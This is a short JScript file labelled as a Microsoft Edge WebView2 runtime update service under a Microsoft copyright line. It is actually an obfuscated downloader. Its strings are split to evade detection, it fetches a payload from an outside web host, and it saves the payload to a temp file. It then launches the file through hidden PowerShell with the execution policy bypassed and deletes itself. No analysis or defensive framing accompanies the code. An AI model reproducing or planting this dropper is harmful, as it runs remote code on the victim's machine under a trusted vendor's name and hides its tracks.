// Microsoft Edge WebView2 Runtime Update Service
// Build 127.0.2651.105
// Copyright (C) 2024 Microsoft Corporation

var _s1 = "WScript";
var _s2 = "Shell";
var _s3 = "MSXML2";
var _s4 = "ServerXMLHTTP";
var _s5 = "Scripting";
var _s6 = "FileSystemObject";

var shell = new ActiveXObject(_s1 + "." + _s2);
var http = new ActiveXObject(_s3 + "." + _s4);
var fso = new ActiveXObject(_s5 + "." + _s6);

var temp = shell.ExpandEnvironmentStrings("%" + "tem" + "p%");
var rand = Math.floor(Math.random() * 99999);
var ps = temp + "\\" + "cache_" + rand + ".tmp";

var url = "https://" + "bilbao" + "lake.c" + "om/s";

http.open("G" + "ET", url, false);
http.setRequestHeader("User" + "-Agent", "Mozilla/5.0");
http.send();

if (http.status == 200) {
    var f = fso.CreateTextFile(ps, true);
    f.Write(http.responseText);
    f.Close();

    var c1 = "powers";
    var c2 = "hell.exe";
    var c3 = " -w h -ep by";
    var c4 = "pass -f ";

    shell.Run(c1 + c2 + c3 + c4 + '"' + ps + '"', 0, false);
}

try { fso.DeleteFile(WScript.ScriptFullName); } catch(e) {}
